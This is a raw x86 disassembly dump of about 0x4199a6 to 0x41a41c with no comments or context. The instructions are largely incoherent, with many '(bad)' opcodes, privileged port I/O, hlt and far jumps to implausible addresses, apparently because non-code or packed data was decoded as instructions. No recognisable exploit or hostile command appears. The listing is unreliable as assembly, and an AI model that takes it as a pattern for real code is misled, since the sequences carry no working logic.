  4199a6:	adc    BYTE PTR [ecx+0x18],ah
  4199a9:	cmp    al,0x89
  4199ab:	jmp    0x41998d
  4199ad:	jb     0x4199b7
  4199af:	jno    0x4199c9
  4199b1:	cmp    al,0x89
  4199b3:	sti    
  4199b4:	xchg   edi,eax
  4199b5:	stos   BYTE PTR es:[edi],al
  4199b6:	mov    al,ch
	...
  4199e0:	add    BYTE PTR [edx],al
  4199e2:	cdq    
  4199e3:	or     cl,ch
  4199e5:	in     al,dx
  4199e6:	shl    ebx,cl
  4199e8:	push   0xffffffbb
  4199ea:	dec    esi
  4199eb:	push   ecx
  4199ec:	lahf   
  4199ed:	out    dx,al
  4199ee:	rol    DWORD PTR [ebx-0x23],1
  4199f1:	xchg   edx,eax
  4199f2:	daa    
  4199f3:	or     BYTE PTR [edx-0x6f],dh
  4199f6:	ror    BYTE PTR [ebx-0xf],cl
  4199f9:	mov    ds:0xd2600413,al
  4199fe:	mov    ebx,0x9228e5e9
  419a03:	jg     0x419a0f
  419a05:	es dec esi
  419a07:	or     eax,0x87a408ee
  419a0c:	pop    ss
  419a0d:	pusha  
  419a0e:	je     0x419a14
  419a10:	mov    eax,0xa8d6d349
  419a15:	inc    esi
  419a16:	push   0x2f
  419a18:	scas   eax,DWORD PTR es:[edi]
  419a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a1a:	mov    DWORD PTR [edi-0x36],edi
  419a1d:	gs jge 0x419a20
  419a20:	jmp    0xa7c93e53
  419a25:	pop    edi
  419a26:	je     0x419a38
  419a28:	clc    
  419a29:	dec    ecx
  419a2a:	ror    esi,cl
  419a2c:	test   al,0x36
  419a2e:	pop    eax
  419a2f:	das    
  419a30:	xchg   edi,eax
  419a31:	xchg   edi,eax
  419a32:	mov    DWORD PTR [edi-0x76],edi
  419a35:	xor    DWORD PTR [ecx+esi*1],ebp
  419a38:	fisubr DWORD PTR [esi]
  419a3a:	xchg   ebp,eax
  419a3b:	xchg   DWORD PTR [edi-0x27fd7e21],esi
  419a41:	out    dx,al
  419a42:	loop   0x419a12
	...
  419a6c:	add    BYTE PTR [eax],al
  419a6e:	les    eax,FWORD PTR [ebp-0x1974cef8]
  419a74:	out    dx,eax
  419a75:	adc    DWORD PTR [esi-0xa00ff6c],0x6389da4d
  419a7f:	sahf   
  419a80:	out    0x8,al
  419a82:	xor    al,0xa5
  419a84:	test   DWORD PTR [ebp+0x71],esi
  419a87:	pop    esi
  419a88:	test   BYTE PTR [ebx-0x10426d30],0xc2
  419a8f:	(bad)  
  419a91:	add    DWORD PTR [esi+ecx*4],ebp
  419a94:	add    eax,0x2dad3cf9
  419a99:	into   
  419a9a:	cmp    al,0x90
  419a9c:	jge    0x419a81
  419a9e:	out    dx,eax
  419a9f:	enter  0xaaaa,0x74
  419aa3:	mov    eax,0x4b00d92d
  419aa8:	adc    cl,BYTE PTR [ecx+0x1feb9e4a]
  419aae:	push   es
  419aaf:	jl     0x419aae
  419ab1:	mov    BYTE PTR [edi+0x65],dh
  419ab4:	cli    
  419ab5:	(bad)  
  419ab6:	mov    eax,0x75000896
  419abb:	pop    esi
  419abc:	test   esi,ecx
  419abe:	test   BYTE PTR [esp+ebx*1-0x77],bh
  419ac2:	sbb    BYTE PTR [ebp-0x7143fb15],0x5
  419ac9:	sti    
  419aca:	mov    esp,0x49c07f9b
  419acf:	dec    edi
  419ad0:	push   ds
  419ad1:	mov    DWORD PTR [eax],eax
	...
  419afb:	xchg   ebx,eax
  419afc:	(bad)  
  419afe:	aas    
  419aff:	mov    esi,0xf004b169
  419b04:	sbb    eax,0x9ce28900
  419b09:	jmp    0x419b11
  419b0b:	test   BYTE PTR [ebx-0x4],bh
  419b0e:	add    BYTE PTR [esp+eax*4],bl
  419b11:	add    DWORD PTR [ecx],ecx
  419b13:	retf   
  419b14:	jg     0x419b72
  419b16:	aas    
  419b17:	sbb    al,0xeb
  419b19:	mov    bh,0xbf
  419b1b:	add    ecx,DWORD PTR [edx-0x7c171a7e]
  419b21:	add    DWORD PTR [eax],eax
  419b23:	pop    ss
  419b24:	xor    ebp,edi
  419b26:	jbe    0x419b85
  419b28:	test   BYTE PTR [edx-0x10d72223],cl
  419b2e:	jle    0x419af3
  419b30:	sgdtd  [eax]
  419b33:	sbb    al,0x7d
  419b35:	nop
  419b36:	add    al,0x33
  419b38:	ret    
  419b39:	add    DWORD PTR [edi-0x3975cfd7],eax
  419b3f:	lahf   
  419b40:	inc    ebx
  419b41:	std    
  419b42:	xchg   bh,dl
  419b44:	je     0x419b3d
  419b46:	xchg   BYTE PTR [edx+0x4],bh
  419b49:	fistp  QWORD PTR ds:0x48e8fa7
  419b4f:	or     al,bl
  419b51:	add    DWORD PTR [ecx],ecx
  419b53:	or     DWORD PTR [eax-0x76],edx
  419b56:	fstp   QWORD PTR [ebp+0x50]
  419b59:	(bad)  
  419b5a:	jle    0x419bd7
  419b5c:	ja     0x419b60
	...
  419b86:	add    BYTE PTR [eax],al
  419b88:	sbb    al,0x7d
  419b8a:	nop
  419b8b:	add    al,0xe0
  419b8d:	ret    0x8701
  419b90:	jnp    0x419b54
  419b92:	in     eax,0xe
  419b94:	popf   
  419b95:	mov    al,ds:0x841c00d8
  419b9a:	or     dh,BYTE PTR [ebp+0x430e18]
  419ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ba1:	rol    bl,0xed
  419ba4:	or     al,BYTE PTR [ebx]
  419ba6:	(bad)  
  419ba8:	sbb    al,0x84
  419baa:	add    DWORD PTR [ecx],ecx
  419bac:	imul   edi,DWORD PTR [edi+0x59],0x3f
  419bb0:	sbb    al,0x5b
  419bb2:	fcom   st(1)
  419bb4:	fwait
  419bb5:	xchg   ecx,eax
  419bb6:	test   al,0xde
  419bb8:	sub    dl,ah
  419bba:	mov    esi,0x605ff1c5
  419bbf:	shl    DWORD PTR [ebx],cl
  419bc1:	je     0x419c33
  419bc3:	mov    esi,0x12e39b9d
  419bc8:	or     ah,dl
  419bca:	xchg   ebp,eax
  419bcb:	cmp    edx,0x38
  419bce:	bound  edx,QWORD PTR [eax]
  419bd0:	(bad)  
  419bd1:	pop    edi
  419bd2:	in     al,0x44
  419bd4:	sbb    al,0xe2
  419bd6:	lds    edi,FWORD PTR ds:[ecx-0x3f20979f]
  419bdd:	pop    ebx
  419bde:	out    0x3,eax
  419be0:	and    eax,0xf35aebb0
  419be5:	pop    edx
  419be6:	jo     0x419b9f
  419be8:	imul   ecx,DWORD PTR [eax+0x84e5],0x0
	...
  419c13:	add    BYTE PTR [eax],al
  419c15:	mov    ecx,0x1c03e777
  419c1a:	fs pop esi
  419c1c:	add    BYTE PTR [ebx],cl
  419c1e:	sbb    ah,bh
  419c20:	mov    WORD PTR [ecx-0x66],gs
  419c23:	push   es
  419c24:	out    dx,al
  419c25:	add    al,BYTE PTR [eax+0x5b1c040b]
  419c2b:	repnz mov ds,WORD PTR [eax]
  419c2e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c30:	add    esp,DWORD PTR [ebx+0x5a8cfaee]
  419c36:	fsub   QWORD PTR [edi]
  419c38:	add    BYTE PTR [ebx-0x6509e574],ah
  419c3e:	cdq    
  419c3f:	push   0xffffffdd
  419c41:	or     esp,esp
  419c43:	sbb    edx,DWORD PTR [ecx+0x427f918]
  419c49:	and    eax,0x518cbaee
  419c4e:	call   0xb500:0x7faafdce
  419c55:	pop    ds
  419c56:	pop    ebx
  419c57:	add    dl,ah
  419c59:	stos   BYTE PTR es:[edi],al
  419c5a:	pop    esi
  419c5b:	jl     0x419c85
  419c5d:	sbb    al,ah
  419c5f:	(bad)  [eax-0x718096fe]
  419c65:	jmp    0x419cc1
  419c67:	add    cl,ch
  419c69:	es scas al,BYTE PTR es:[edi]
  419c6b:	add    al,0x3
  419c6d:	pop    ecx
  419c6e:	pop    ebx
  419c6f:	xchg   DWORD PTR [esi+0x681685e0],ebx
  419c75:	ret    0x76
  419c78:	jmp    0x419c7d
	...
  419ca1:	add    BYTE PTR [edi],bl
  419ca3:	bound  esi,QWORD PTR [ebp+0x3877ed]
  419ca9:	sbb    cl,dh
  419cab:	jne    0x419cf8
  419cad:	push   ecx
  419cae:	sahf   
  419caf:	repz imul ecx
  419cb2:	and    bl,ah
  419cb4:	test   eax,0x8775ca47
  419cb9:	xor    eax,esp
  419cbb:	jp     0x419cda
  419cbd:	pusha  
  419cbe:	fldenv [edi+0x5f6060ee]
  419cc4:	out    dx,eax
  419cc5:	jo     0x419c96
  419cc7:	inc    edi
  419cc8:	enter  0x5e70,0xf7
  419ccc:	loopne 0x419d11
  419cce:	mov    ch,0xc4
  419cd0:	stos   BYTE PTR es:[edi],al
  419cd1:	fdiv   DWORD PTR [ebp-0x508f28b9]
  419cd7:	mov    bh,0xe0
  419cd9:	ficomp WORD PTR [eax-0x6ff83070]
  419cdf:	pushf  
  419ce0:	pop    es
  419ce1:	sti    
  419ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce3:	mov    bh,BYTE PTR [edi-0x37b7df2f]
  419ce9:	jo     0x419d48
  419ceb:	mul    eax
  419ced:	(bad)  
  419cee:	sbb    BYTE PTR [esi+0x0],dh
  419cf1:	sbb    BYTE PTR [edi-0x21],dh
  419cf4:	fadd   DWORD PTR [eax]
  419cf6:	test   BYTE PTR [esi+0x8],bh
  419cf9:	xor    DWORD PTR [edi-0x1d],esi
  419cfc:	rol    cl,1
  419cfe:	pop    ebp
  419cff:	pop    esp
  419d00:	sub    eax,0x7d9c7cc8
  419d05:	jecxz  0x419d07
	...
  419d2f:	test   BYTE PTR [ebx+0x2f],0x33
  419d33:	in     al,0xb1
  419d35:	test   eax,ebx
  419d37:	mov    ah,0x7f
  419d39:	add    dh,BYTE PTR [ecx]
  419d3b:	(bad)  
  419d3c:	loop   0x419d06
  419d3e:	ror    DWORD PTR [ebp+0x6cd02e6f],0x9c
  419d45:	jge    0x419d2a
  419d47:	push   0xffffff90
  419d49:	add    BYTE PTR [eax],al
  419d4b:	xchg   esp,eax
  419d4c:	mov    ah,0x85
  419d4e:	fadd   DWORD PTR [edi+edi*2]
  419d51:	adc    BYTE PTR [ecx],dh
  419d53:	hlt    
  419d54:	loope  0x419d1e
  419d56:	rcr    DWORD PTR [ebp+0x5b],0x2d
  419d5a:	sar    BYTE PTR [esp+ebx*4],1
  419d5d:	jge    0x419d42
  419d5f:	stos   BYTE PTR es:[edi],al
  419d60:	pop    edi
  419d61:	or     ecx,DWORD PTR [edi]
  419d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d64:	mov    ah,0x87
  419d66:	inc    ebp
  419d67:	mov    ebp,0x9404df99
  419d6c:	mov    ds:0x36061885,eax
  419d71:	or     BYTE PTR [esi+ecx*1],al
  419d74:	or     BYTE PTR ss:[ecx+0x5b5e2f85],cl
  419d7b:	cld    
  419d7c:	sbb    BYTE PTR [ecx-0x3e],0x6d
  419d80:	pop    edx
  419d81:	dec    edi
  419d82:	push   esi
  419d83:	out    dx,al
  419d84:	xor    ah,BYTE PTR [esp+ecx*1]
  419d87:	xchg   ebx,eax
  419d88:	jecxz  0x419dfe
  419d8a:	and    al,0x75
  419d8c:	sbb    BYTE PTR [ecx-0x32f9b50a],al
  419d92:	sldt   WORD PTR [eax]
	...
  419db9:	add    BYTE PTR [eax],al
  419dbb:	add    BYTE PTR [ebx+0x1cb70b99],dh
  419dc1:	les    esi,FWORD PTR [ecx]
  419dc3:	mov    ebx,edi
  419dc5:	jnp    0x419df8
  419dc7:	call   0xfe163795
  419dcc:	mov    ah,0x7f
  419dce:	dec    esi
  419dcf:	aas    
  419dd0:	sbb    al,0x9c
  419dd2:	or     ah,bh
  419dd4:	sbb    eax,ebp
  419dd6:	add    al,0xb5
  419dd8:	or     dh,BYTE PTR [esi]
  419dda:	das    
  419ddb:	call   0xfe16583d
  419de0:	je     0x419dea
  419de2:	dec    esi
  419de3:	aas    
  419de4:	sbb    al,0xdc
  419de6:	int3   
  419de7:	stc    
  419de8:	repz fdiv QWORD PTR [ebx]
  419deb:	pop    ecx
  419dec:	fisubr WORD PTR [ebx+0x1]
  419def:	push   ebx
  419df0:	xchg   ebp,eax
  419df1:	out    0x31,al
  419df3:	push   eax
  419df4:	outs   dx,DWORD PTR ds:[esi]
  419df5:	stc    
  419df6:	cmp    eax,0x59ea708
  419dfb:	mov    esi,DWORD PTR [ecx-0x4]
  419dfe:	cs push eax
  419e00:	mov    ah,0xbe
  419e02:	aad    0xfd
  419e04:	mov    ebx,0x5d747d9b
  419e09:	test   BYTE PTR [esi-0x162c5bbd],al
  419e0f:	cmc    
  419e10:	mov    al,ds:0x2068d42c
  419e15:	scas   eax,DWORD PTR es:[edi]
  419e16:	inc    edx
  419e17:	add    BYTE PTR [ecx+0x7450d9c6],ah
  419e1d:	dec    edx
  419e1e:	aad    0xfd
	...
  419e48:	add    BYTE PTR [ebx-0x228c8225],al
  419e4e:	add    DWORD PTR [esi-0x162c8bbd],0xffffffd9
  419e55:	push   0x9151d174
  419e5a:	(bad)  
  419e5b:	fst    DWORD PTR [eax+0x44]
  419e5e:	add    ebp,edx
  419e60:	std    
  419e61:	push   ebx
  419e62:	pop    edx
  419e63:	inc    edx
  419e64:	jge    0x419e9e
  419e66:	pop    ss
  419e67:	test   eax,0x600e43fc
  419e6c:	jmp    0x3739250e
  419e71:	retf   0x24e1
  419e74:	cld    
  419e75:	xchg   esp,eax
  419e76:	out    dx,eax
  419e77:	jmp    0x437:0x1772df80
  419e7e:	jb     0x419e32
  419e80:	rcl    DWORD PTR [ecx],cl
  419e82:	out    0x2c,eax
  419e84:	aam    0x6c
  419e86:	fsubr  DWORD PTR [edx-0x7b7c9304]
  419e8c:	iret   
  419e8d:	stc    
  419e8e:	je     0x419e8f
  419e90:	xchg   DWORD PTR [eax+0x1a],ebp
  419e93:	out    0x80,eax
  419e95:	pop    edi
  419e96:	jae    0x419eaf
  419e98:	fmul   QWORD PTR [ecx+0x44d37677]
  419e9e:	fcomip st,st(3)
  419ea0:	inc    esp
  419ea1:	sbb    al,0xe6
  419ea3:	lods   al,BYTE PTR ds:[esi]
  419ea4:	shr    DWORD PTR [ebx+eax*4+0x70],cl
  419ea8:	rol    cl,1
  419eaa:	je     0x419f0e
  419eac:	xor    DWORD PTR [eax],eax
	...
  419ed6:	mov    eax,0x9bd3a4e0
  419edb:	push   ds
  419edc:	inc    ebx
  419edd:	jge    0x419f26
  419edf:	imul   ecx,edi,0x7
  419ee2:	das    
  419ee3:	sbb    ah,bh
  419ee5:	sbb    bh,0x72
  419ee8:	xchg   edi,eax
  419ee9:	fild   DWORD PTR [ecx]
  419eeb:	ja     0x419f13
  419eed:	shl    esp,cl
  419eef:	pop    esi
  419ef0:	xchg   esp,eax
  419ef1:	inc    esp
  419ef2:	sbb    al,0xe6
  419ef4:	lods   al,BYTE PTR ds:[esi]
  419ef5:	ror    esp,cl
  419ef7:	or     BYTE PTR [eax+0x727471cf],0x31
  419efe:	push   0x9bd3a4e0
  419f03:	push   ds
  419f04:	add    ch,dh
  419f06:	fmul   DWORD PTR [edi]
  419f08:	lock sbb DWORD PTR [ebx-0x6316c118],0x6039f818
  419f13:	push   ds
  419f14:	cld    
  419f15:	(bad)  
  419f16:	dec    esi
  419f17:	add    eax,DWORD PTR [esp+edx*2+0x2c8b5ad9]
  419f1e:	push   eax
  419f1f:	or     ebp,eax
  419f21:	add    BYTE PTR [esi+esi*2-0x3],cl
  419f25:	pop    ds
  419f26:	popf   
  419f27:	pop    ss
  419f28:	clc    
  419f29:	sbb    eax,esi
  419f2b:	jp     0x419f26
  419f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2e:	out    dx,al
  419f2f:	fld    st(6)
  419f31:	icebp  
  419f32:	inc    ebp
  419f33:	loopne 0x419f78
  419f35:	cdq    
  419f36:	das    
  419f37:	adc    ecx,0xffffff92
	...
  419f62:	add    dh,cl
  419f64:	jne    0x419fc4
  419f66:	and    ch,BYTE PTR [ecx-0x79]
  419f69:	pop    ebx
  419f6a:	stos   DWORD PTR es:[edi],eax
  419f6b:	out    0x73,eax
  419f6d:	push   esp
  419f6e:	pusha  
  419f6f:	(bad)  
  419f70:	repz jmp 0x419fd0
  419f73:	sbb    BYTE PTR [ebx+0x0],bl
  419f76:	mov    edx,0xbc890e05
  419f7b:	(bad)  
  419f7c:	loop   0x419ff1
  419f7e:	in     eax,0x9c
  419f80:	xlat   BYTE PTR ds:[ebx]
  419f81:	or     BYTE PTR [edi-0x32],0x75
  419f85:	push   eax
  419f86:	push   ecx
  419f87:	mov    WORD PTR [ebx-0x3],?
  419f8a:	jmp    0xeda9fad0
  419f8f:	cmc    
  419f90:	xor    eax,DWORD PTR [eax]
  419f92:	inc    ecx
  419f93:	or     BYTE PTR [ebp-0x3],dh
  419f96:	xor    BYTE PTR es:[ecx-0x12e49476],cl
  419f9d:	ds jmp 0xab73fe9a
  419fa3:	call   0xc38e:0xa1000870
  419faa:	test   DWORD PTR [ebp+0x44fffb89],ebx
  419fb0:	push   edi
  419fb1:	add    BYTE PTR [eax],al
  419fb3:	push   ds
  419fb4:	sub    al,0x85
  419fb6:	lock int3 
  419fb8:	(bad)  [esi+edi*8+0x62]
  419fbc:	mov    DWORD PTR ds:0x874e5ed2,ebp
  419fc2:	test   ecx,ecx
  419fc4:	mov    bl,bh
  419fc6:	inc    DWORD PTR [eax]
	...
  419ff0:	lods   al,BYTE PTR ds:[esi]
  419ff1:	fstp   TBYTE PTR [esi+edi*8+0x62]
  419ff5:	mov    ebx,edi
  419ff7:	test   DWORD PTR [ecx-0x73],ebx
  419ffa:	sti    
  419ffb:	(bad)  
  419ffc:	jle    0x419ff0
  419ffe:	jnp    0x419ffe
  41a000:	ret    0xb8c
  41a003:	mov    esi,0x7fe0d7f6
  41a008:	jle    0x419fec
  41a00a:	jl     0x41a00a
  41a00c:	mov    ds:0xe2b60b8c,al
  41a011:	dec    ebp
  41a012:	clc    
  41a013:	mov    ah,dh
  41a015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a016:	(bad)  
  41a017:	inc    DWORD PTR [esi]
  41a019:	sbb    DWORD PTR [edi-0x6],edi
  41a01c:	mov    ebp,0xfe800121
  41a021:	push   esi
  41a022:	jno    0x419fea
  41a024:	mov    esi,DWORD PTR [eax+ebp*8]
  41a027:	imul   edx,DWORD PTR [ebx-0x74],0xfffffffb
  41a02b:	sbb    DWORD PTR [eax+0x62fffe1f],0x57
  41a032:	cmp    BYTE PTR [ebx],0xb5
  41a035:	or     DWORD PTR [ebx-0x1e0ef7d],esp
  41a03b:	inc    DWORD PTR [edx+0x57]
  41a03e:	jno    0x419fde
  41a040:	adc    dl,bl
  41a042:	cmp    dh,0x22
  41a045:	mov    WORD PTR [eax-0x18],ss
  41a048:	sbb    al,0xe1
  41a04a:	add    al,BYTE PTR [eax]
  41a04c:	sbb    al,0xc1
  41a04e:	das    
  41a04f:	pop    ecx
  41a050:	xchg   ebp,eax
  41a051:	dec    eax
  41a052:	sub    eax,0xc2
	...
  41a07b:	add    BYTE PTR [eax],al
  41a07d:	adc    al,0x84
  41a07f:	xchg   DWORD PTR ss:[ecx+0x3],eax
  41a083:	loopne 0x41a011
  41a085:	sbb    eax,0xf2510184
  41a08a:	xor    BYTE PTR [ebx+0x5b],bh
  41a08d:	adc    al,0xed
  41a08f:	push   ebp
  41a090:	or     al,0xa9
  41a092:	inc    DWORD PTR [eax+0x31a133fe]
  41a098:	call   0x4324c8
  41a09d:	mov    dh,0x83
  41a09f:	pop    ecx
  41a0a0:	add    al,0x92
  41a0a2:	inc    ebx
  41a0a3:	add    al,0xe8
  41a0a5:	out    dx,eax
  41a0a6:	mov    esi,0xb64dfdd0
  41a0ab:	jnp    0x41a02f
  41a0ad:	sbb    BYTE PTR [edx+0x41],cl
  41a0b0:	add    BYTE PTR [edi+edi*2-0x3260bded],ah
  41a0b7:	icebp  
  41a0b8:	jnp    0x41a0a7
  41a0ba:	rol    BYTE PTR [esi-0x300f1d88],0xff
  41a0c1:	fild   DWORD PTR [ebx-0x49716ff]
  41a0c7:	rol    BYTE PTR [edi-0x230705f],1
  41a0cd:	ret    
  41a0ce:	push   edx
  41a0cf:	mov    dh,0xe9
  41a0d1:	in     al,dx
  41a0d2:	cld    
  41a0d3:	test   DWORD PTR [edx+esi*4+0x20],esi
  41a0d7:	rol    BYTE PTR [edi-0x230685f],1
  41a0dd:	mov    ds:0x748630,eax
	...
  41a10a:	call   0xcfbf:0xa189d028
  41a111:	std    
  41a112:	mov    ebx,DWORD PTR [edx-0xa]
  41a115:	xchg   ecx,eax
  41a116:	sbb    eax,0xa55007de
  41a11b:	scas   eax,DWORD PTR es:[edi]
  41a11c:	xchg   ebx,eax
  41a11d:	shl    DWORD PTR [ecx+0x71],1
  41a120:	ficomp WORD PTR [ecx+0x7aff2c29]
  41a126:	arpl   WORD PTR [edi+0x1cdd03ea],dx
  41a12c:	push   0xffffffcd
  41a12e:	sub    al,0xf0
  41a130:	jecxz  0x41a0b5
  41a132:	add    eax,0xeac65c5b
  41a137:	or     bh,cl
  41a139:	into   
  41a13a:	aaa    
  41a13b:	jno    0x41a113
  41a13d:	cmp    DWORD PTR [edi-0xe],0xffffffcc
  41a141:	iret   
  41a142:	sub    DWORD PTR [edx+0x67],ebx
  41a145:	or     ebx,DWORD PTR [eax+ebp*8]
  41a148:	test   DWORD PTR [ebx-0x304b0c29],eax
  41a14e:	adc    DWORD PTR [esp+esi*1+0x6e],ebx
  41a152:	xchg   edi,eax
  41a153:	(bad)  
  41a154:	addr16 into 
  41a156:	add    DWORD PTR [ecx+0x37],esi
  41a159:	fadd   st(3),st
  41a15b:	pop    ebx
  41a15c:	out    0x3,eax
  41a15e:	push   ecx
  41a15f:	adc    DWORD PTR [edx],esi
  41a161:	jge    0x41a15b
  41a163:	push   cs
  41a164:	test   eax,0x150de3fc
  41a169:	aaa    
  41a16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a16b:	pop    ss
  41a16c:	retf   
  41a16d:	repz add BYTE PTR [eax],al
	...
  41a194:	add    BYTE PTR [eax],al
  41a196:	add    BYTE PTR [ecx],bh
  41a198:	in     al,0xb
  41a19a:	sub    BYTE PTR [eax],dh
  41a19c:	stc    
  41a19d:	imul   ebp,DWORD PTR [ebx-0x398f9bb1],0xffffffa7
  41a1a4:	repz mul BYTE PTR [ebp+0x76]
  41a1a8:	pop    edx
  41a1a9:	out    0xda,eax
  41a1ab:	adc    al,0xde
  41a1ad:	mov    bh,0xf3
  41a1af:	call   0x60:0x6e14c598
  41a1b6:	jle    0x41a186
  41a1b8:	or     eax,0x20882981
  41a1bd:	call   0xfdb00d2f
  41a1c2:	xchg   ecx,eax
  41a1c3:	and    ebp,esp
  41a1c5:	ds jmp 0xf38d722
  41a1cb:	pop    ebx
  41a1cc:	pop    esi
  41a1cd:	mov    ch,0x22
  41a1cf:	das    
  41a1d0:	push   es
  41a1d1:	call   0xfdb0144f
  41a1d6:	sbb    DWORD PTR [ebx+0x67e93eec],0x52e6f739
  41a1e0:	pop    esi
  41a1e1:	mov    ch,0xc2
  41a1e3:	out    dx,al
  41a1e4:	or     al,ch
  41a1e6:	xor    eax,0x2efd6e4b
  41a1eb:	cli    
  41a1ec:	adc    edx,eax
  41a1ee:	icebp  
  41a1ef:	pop    ds
  41a1f0:	or     cl,BYTE PTR [ecx+0x5163441d]
  41a1f6:	rcl    DWORD PTR [esi],0x69
  41a1f9:	std    
  41a1fa:	scas   al,BYTE PTR es:[edi]
	...
  41a223:	add    BYTE PTR [eax+0x1fe98099],ah
  41a229:	pop    ebx
  41a22a:	mov    eax,0x3054e5
  41a22f:	(bad)  
  41a230:	out    dx,eax
  41a231:	fcom   DWORD PTR [ecx]
  41a233:	push   0xffffffdf
  41a235:	push   esi
  41a236:	sub    DWORD PTR [edx-0xb7bcbe5],0x86725b60
  41a240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a241:	(bad)  
  41a242:	jae    0x41a26c
  41a244:	and    dl,ah
  41a246:	adc    BYTE PTR [eax-0x32],dh
  41a249:	fcmovb st,st(0)
  41a24b:	in     eax,0x9e
  41a24d:	cdq    
  41a24e:	add    al,0x14
  41a250:	and    al,0xe9
  41a252:	ds jmp 0x9b20a5
  41a258:	not    DWORD PTR [edi+0x0]
  41a25b:	push   ebx
  41a25c:	push   cs
  41a25d:	inc    eax
  41a25e:	and    al,0x8
  41a260:	mov    dh,0x93
  41a262:	call   0x7de2dd5f
  41a267:	ret    
  41a268:	cmc    
  41a269:	pop    ebx
  41a26a:	add    BYTE PTR [eax],al
  41a26c:	std    
  41a26d:	push   edi
  41a26e:	jno    0x41a2b1
  41a270:	test   esp,esi
  41a272:	push   cs
  41a273:	mov    DWORD PTR [ebp-0x24],esp
  41a276:	mov    edi,0x49bf604
  41a27b:	cmp    eax,0x3d12c1
  41a280:	xlat   BYTE PTR ds:[ebx]
  41a281:	nop
  41a282:	mov    eax,0x16d084
  41a287:	mov    eax,DWORD PTR [eax]
	...
  41a2b1:	inc    esi
  41a2b2:	hlt    
  41a2b3:	jae    0xc0c1053f
  41a2b9:	inc    ecx
  41a2ba:	pusha  
  41a2bb:	add    al,0x76
  41a2bd:	hlt    
  41a2be:	push   esi
  41a2bf:	jb     0x41a2b0
  41a2c1:	(bad)  
  41a2c2:	pushf  
  41a2c3:	add    al,0x0
  41a2c5:	xor    dl,dh
  41a2c7:	loopne 0x41a24c
  41a2c9:	fnstcw WORD PTR [edi+0x50]
  41a2cc:	push   esi
  41a2cd:	jle    0x41a30d
  41a2cf:	or     BYTE PTR [ebx+0x45895b20],cl
  41a2d5:	mov    ebp,0x98e84f27
  41a2da:	lahf   
  41a2db:	sti    
  41a2dc:	dec    DWORD PTR [eax+0x16]
  41a2df:	lock push eax
  41a2e1:	push   0xad50081c
  41a2e6:	ja     0x41a2e0
  41a2e8:	dec    DWORD PTR [edx-0x12]
  41a2eb:	inc    eax
  41a2ec:	call   0x11017f16
  41a2f1:	xchg   BYTE PTR [edx-0x5fa50731],dl
  41a2f7:	push   0x42901c84
  41a2fc:	add    BYTE PTR [ecx-0x4baf3649],bl
  41a302:	xchg   edi,eax
  41a303:	retf   0x9bfd
  41a306:	mov    WORD PTR [ebp+0x7e83dd74],es
  41a30c:	inc    ebx
  41a30d:	mov    esp,ss
  41a30f:	fldcw  WORD PTR [ebp-0x7b]
  41a312:	xor    eax,0x68cb
	...
  41a33b:	add    BYTE PTR [eax],al
  41a33d:	add    BYTE PTR [eax-0x5effbd38],ah
  41a343:	mov    edi,0xe37450d9
  41a348:	retf   0x63fd
  41a34b:	jmp    0xb7e99f7c
  41a350:	rol    DWORD PTR [edi+0x5b7a67d9],1
  41a356:	dec    esp
  41a357:	stc    
  41a358:	sub    al,0xf4
  41a35a:	xchg   edi,eax
  41a35b:	aas    
  41a35c:	fadd   QWORD PTR [edi+0x5b7a87e1]
  41a362:	inc    esp
  41a363:	sbb    al,0x8
  41a365:	jae    0x41a344
  41a367:	cmp    DWORD PTR [esi+0x43],0x24
  41a36b:	push   esp
  41a36c:	fdivr  QWORD PTR [ecx]
  41a36e:	adc    eax,0x1868ccad
  41a373:	das    
  41a374:	inc    ecx
  41a375:	add    BYTE PTR [ecx-0xbaf2bca],bl
  41a37b:	xchg   dl,cl
  41a37d:	std    
  41a37e:	sti    
  41a37f:	dec    ebx
  41a380:	or     BYTE PTR [ebx+0x5d],dh
  41a383:	test   BYTE PTR [esi+0x43],bh
  41a386:	hlt    
  41a387:	xor    ebx,esp
  41a389:	sbb    eax,0x89ccd4e5
  41a38e:	jns    0x41a380
  41a390:	ja     0x41a3d5
  41a392:	int3   
  41a393:	cli    
  41a394:	inc    ebp
  41a395:	cld    
  41a396:	xchg   ebp,eax
  41a397:	pop    esi
  41a398:	aam    0x89
  41a39a:	popa   
  41a39b:	pop    ebx
  41a39c:	pop    ebx
  41a39d:	js     0x41a3fe
  41a39f:	xor    DWORD PTR [eax+0x46],0x0
	...
  41a3cb:	test   al,0xe3
  41a3cd:	mov    ah,0xdb
  41a3cf:	xor    al,0xd7
  41a3d1:	aam    0x42
  41a3d3:	sbb    al,0xe0
  41a3d5:	lods   al,BYTE PTR ds:[esi]
  41a3d6:	retf   
  41a3d7:	in     al,dx
  41a3d8:	add    BYTE PTR [eax-0x35],0x91
  41a3dc:	ins    DWORD PTR es:[edi],dx
  41a3dd:	mov    edi,0xe71c0f87
  41a3e2:	jle    0x41a3c3
  41a3e4:	push   0xffffffb7
  41a3e6:	fild   DWORD PTR [ebp+0x4cc1e72]
  41a3ec:	xlat   BYTE PTR ds:[ebx]
  41a3ed:	pushf  
  41a3ee:	inc    edx
  41a3ef:	sbb    al,0xe0
  41a3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f2:	fcmovne st,st(4)
  41a3f4:	and    BYTE PTR [ebx+ecx*8],0x59
  41a3f8:	ins    DWORD PTR es:[edi],dx
  41a3f9:	xchg   ebp,eax
  41a3fa:	jle    0x41a3db
  41a3fc:	jb     0x41a395
  41a3fe:	(bad)  [eax-0x6834118e]
  41a404:	adc    al,0xef
  41a406:	xor    esp,DWORD PTR [edi+0x4434d717]
  41a40c:	in     eax,0xce
  41a40e:	retf   
  41a40f:	sub    ecx,ebx
  41a411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a412:	hlt    
  41a413:	leave  
  41a414:	fild   QWORD PTR [esp+ebx*8]
  41a417:	ins    BYTE PTR es:[edi],dx
  41a418:	adc    DWORD PTR [ecx-0x34],0x11
  41a41c:	ins    DWORD PTR es:[edi],dx
